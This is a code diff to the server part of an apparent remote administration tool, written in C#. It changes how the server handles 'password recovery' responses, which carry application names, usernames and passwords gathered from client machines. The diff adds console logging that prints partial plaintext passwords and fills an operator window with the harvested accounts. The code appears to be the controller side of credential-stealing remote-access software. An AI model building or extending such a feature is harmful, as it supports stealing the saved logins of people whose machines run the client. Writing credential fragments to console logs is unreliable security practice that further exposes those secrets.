@@ -179,23 +179,85 @@ namespace RemoteAdmin.Server.Networking
                         }
                         else if (msg is PasswordRecoveryResponseMessage passwordResponse)
                         {
-                            Console.WriteLine($"Received password recovery response: {passwordResponse.Success}, {passwordResponse.Accounts?.Count ?? 0} accounts");
+                            Console.WriteLine($"");
+                            Console.WriteLine($"╔══════════════════════════════════════════════════════════════╗");
+                            Console.WriteLine($"║         PASSWORD RECOVERY RESPONSE RECEIVED                  ║");
+                            Console.WriteLine($"╚══════════════════════════════════════════════════════════════╝");
+                            Console.WriteLine($"");
+                            Console.WriteLine($"[Server] Success: {passwordResponse.Success}");
+                            Console.WriteLine($"[Server] Accounts Count: {passwordResponse.Accounts?.Count ?? 0}");
+                            Console.WriteLine($"[Server] Window Exists: {client.PasswordRecoveryWindow != null}");
+                            Console.WriteLine($"");
+
+                            if (passwordResponse.Accounts != null && passwordResponse.Accounts.Count > 0)
+                            {
+                                Console.WriteLine($"[Server] First 5 passwords for verification:");
+                                for (int i = 0; i < Math.Min(5, passwordResponse.Accounts.Count); i++)
+                                {
+                                    var acc = passwordResponse.Accounts[i];
+                                    string passPreview = string.IsNullOrEmpty(acc.Password)
+                                        ? "[EMPTY]"
+                                        : acc.Password.Substring(0, Math.Min(6, acc.Password.Length)) + "...";
+                                    Console.WriteLine($"[Server]   [{i + 1}] {acc.Application} | {acc.Username} | {passPreview}");
+                                }
+                                Console.WriteLine($"");
+                            }
+
                             _dispatcher.Invoke(() =>
                             {
-                                if (passwordResponse.Success)
+                                Console.WriteLine($"[Server] → Dispatching to UI thread...");
+
+                                if (passwordResponse.Success && passwordResponse.Accounts != null && passwordResponse.Accounts.Count > 0)
                                 {
-                                    client.PasswordRecoveryWindow?.UpdatePasswordList(passwordResponse.Accounts);
+                                    if (client.PasswordRecoveryWindow != null)
+                                    {
+                                        Console.WriteLine($"[Server] → Updating existing window...");
+                                        try
+                                        {
+                                            client.PasswordRecoveryWindow.UpdatePasswordList(passwordResponse.Accounts);
+                                            Console.WriteLine($"[Server] ✓ Window updated successfully with {passwordResponse.Accounts.Count} accounts!");
+                                        }
+                                        catch (Exception ex)
+                                        {
+                                            Console.WriteLine($"[Server] ✗ Error updating window: {ex.Message}");
+                                        }
+                                    }
+                                    else
+                                    {
+                                        Console.WriteLine($"[Server] ✗ Window is NULL! Creating new window...");
+                                        try
+                                        {
+                                            var window = new Passwordrecoverywindow(client);
+                                            window.Show();
+                                            window.UpdatePasswordList(passwordResponse.Accounts);
+                                            Console.WriteLine($"[Server] ✓ New window created with {passwordResponse.Accounts.Count} accounts!");
+                                        }
+                                        catch (Exception ex)
+                                        {
+                                            Console.WriteLine($"[Server] ✗ Error creating window: {ex.Message}");
+                                        }
+                                    }
                                 }
-                                else
+                                else if (!passwordResponse.Success)
                                 {
+                                    Console.WriteLine($"[Server] ✗ Password recovery failed: {passwordResponse.ErrorMessage}");
                                     System.Windows.MessageBox.Show(
                                         $"Password recovery failed: {passwordResponse.ErrorMessage}",
                                         "Password Recovery Error",
                                         System.Windows.MessageBoxButton.OK,
                                         System.Windows.MessageBoxImage.Error);
                                 }
+                                else
+                                {
+                                    Console.WriteLine($"[Server] ⚠ No accounts found or empty account list");
+                                }
                             });
+
+                            Console.WriteLine($"");
+                            Console.WriteLine($"╚══════════════════════════════════════════════════════════════╝");
+                            Console.WriteLine($"");
                         }
+
                     }
                 }
             }
